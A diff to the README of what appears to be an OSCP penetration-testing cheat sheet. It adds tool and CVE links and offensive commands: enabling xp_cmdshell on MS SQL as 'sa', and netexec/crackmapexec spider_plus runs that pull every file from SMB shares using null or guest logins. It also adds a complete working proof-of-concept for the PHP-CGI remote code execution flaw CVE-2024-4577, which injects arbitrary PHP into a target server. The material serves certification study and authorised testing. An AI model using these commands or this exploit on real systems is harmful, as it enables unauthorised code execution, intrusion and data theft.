@@ -4,27 +4,22 @@
 
 # OSCP Cheat Sheet
 
+![GitHub stars](https://img.shields.io/github/stars/0xsyr0/OSCP?logoColor=yellow) ![GitHub forks](https://img.shields.io/github/forks/0xsyr0/OSCP?logoColor=purple) ![GitHub watchers](https://img.shields.io/github/watchers/0xsyr0/OSCP?logoColor=green)</br>
 ![GitHub commit activity (branch)](https://img.shields.io/github/commit-activity/m/0xsyr0/OSCP) ![GitHub contributors](https://img.shields.io/github/contributors/0xsyr0/OSCP)
 
-Commands, Payloads and Resources for the OffSec Certified Professional Certification (OSCP).
+Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [X](https://twitter.com/syr0_) for suggestions.
 
----
+Every contribution is appreciated!
 
-Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [Twitter](https://twitter.com/syr0_) for suggestions.
-
-Every help or hint is appreciated!
-
----
-
-**DISCLAIMER**: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!
+> [!IMPORTANT]
+> A guy on X got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`.
+> I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam.
+> Inform yourself before taking the exam!
 
 Here are the link to the [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
 
----
-
-**END NOTE**: This repository will also try to cover as much as possible of the tools required for the proving grounds boxes.
-
----
+> [!NOTE]
+> This repository will also try to cover as much as possible of the tools required for the proving grounds boxes.
 
 Thank you for reading.
 
@@ -44,6 +39,7 @@ Thank you for reading.
 - [CVEs](#cves)
 - [Payloads](#payloads)
 - [Wordlists](#wordlists)
+- [Reporting](#reporting)
 - [Social Media Resources](#social-media-resources)
 - [Commands](#commands)
 	- [Basics](#basics-1)
@@ -165,6 +161,7 @@ Thank you for reading.
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
   		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
    		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+   		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
   		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
   		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -261,10 +258,12 @@ Thank you for reading.
 | ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
 | ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
 | ADMiner | https://github.com/Mazars-Tech/AD_Miner |
+| adPEAS | https://github.com/ajm4n/adPEAS |
 | BloodHound Docker | https://github.com/belane/docker-bloodhound |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
 | BloodHound | https://github.com/ly4k/BloodHound |
 | BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
+| bloodhound-quickwin | https://github.com/kaluche/bloodhound-quickwin |
 | Certify | https://github.com/GhostPack/Certify |
 | Certipy | https://github.com/ly4k/Certipy |
 | enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
@@ -280,6 +279,7 @@ Thank you for reading.
 | LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
 | LinEnum | https://github.com/rebootuser/LinEnum |
 | lsassy | https://github.com/Hackndo/lsassy |
+| Moriaty | https://github.com/BC-SECURITY/Moriarty |
 | nanodump | https://github.com/helpsystems/nanodump |
 | PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
 | PEASS-ng | https://github.com/carlospolop/PEASS-ng |
@@ -406,6 +406,7 @@ Thank you for reading.
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
 | CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
 | CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
+| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -457,6 +458,14 @@ Thank you for reading.
 | Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
 | SecLists | https://github.com/danielmiessler/SecLists |
 | Username Anarchy | https://github.com/urbanadventurer/username-anarchy |
+
+### Reporting
+
+| Name | URL |
+| --- | --- |
+| SysReptor | https://github.com/Syslifters/sysreptor |
+| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
+| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |
 
 ### Social Media Resources
 
@@ -2105,6 +2114,15 @@ SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DO
 ##### xp_cmdshell
 
 ```c
+SQL> EXECUTE AS LOGIN = 'sa';
+SQL> EXEC sp_configure 'Show Advanced Options', 1; 
+SQL> RECONFIGURE; 
+SQL> EXEC sp_configure 'xp_cmdshell', 1; 
+SQL> RECONFIGURE;
+SQL> EXEC xp_cmdshell 'dir';
+```
+
+```c
 SQL> EXEC sp_configure 'Show Advanced Options', 1;
 SQL> reconfigure;
 SQL> sp_configure;
@@ -2418,9 +2436,11 @@ crackmapexec winrm -L
 crackmapexec smb <RHOST> -u '' -p '' --shares
 crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
 crackmapexec smb <RHOST> -u " " -p "" --shares
 crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
 crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
 crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
 crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
@@ -2662,13 +2682,13 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 netexec smb <RHOST> -u '' -p '' --shares
 netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
 netexec smb <RHOST> -u " " -p "" --shares
 netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
-netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True
-netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
+netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
 netexec smb <RHOST> -u guest -p '' --shares --rid-brute
 netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
 netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
@@ -2694,6 +2714,7 @@ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
 netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
 netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
 netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
+netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M get-network -o ALL=true
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
 netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
 netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
@@ -4102,6 +4123,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 sc qc <SERVICE>
 netsh firewall show state
 schtasks /query /fo LIST /v
+schtasks /query /v /fo LIST | findstr <USERNAME>
 findstr /si password *.xml *.ini *.txt
 dir /s *pass* == *cred* == *vnc* == *.config*
 accesschk.exe -uws "Everyone" "C:\Program Files\"
@@ -5574,6 +5596,59 @@ if __name__ == '__main__':
 
 ```c
 python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
+```
+
+#### CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE
+
+```c
+"""
+PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
+Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
+Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
+Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
+Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
+"""
+
+banner = """			 __         ___  ___________                   
+	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
+	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
+	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
+	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
+				  \\/          \\/     \\/                            
+	  
+        watchTowr-vs-php_cve-2024-4577.py
+        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
+          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
+          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
+        CVEs: [CVE-2024-4577]  """
+
+
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+import requests
+requests.packages.urllib3.disable_warnings()
+import argparse
+
+print(banner)
+print("(^_^) prepare for the Pwnage (^_^)\n")
+
+parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
+parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
+parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
+args = parser.parse_args()
+args.target = args.target.rstrip('/')
+
+
+s = requests.Session()
+s.verify = False
+
+
+
+res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
+if('1337' in res.text ):
+    print('(+) Exploit was successful')
+else:
+    print('(!) Exploit may have failed')
 ```
 
 #### GodPotato LPE
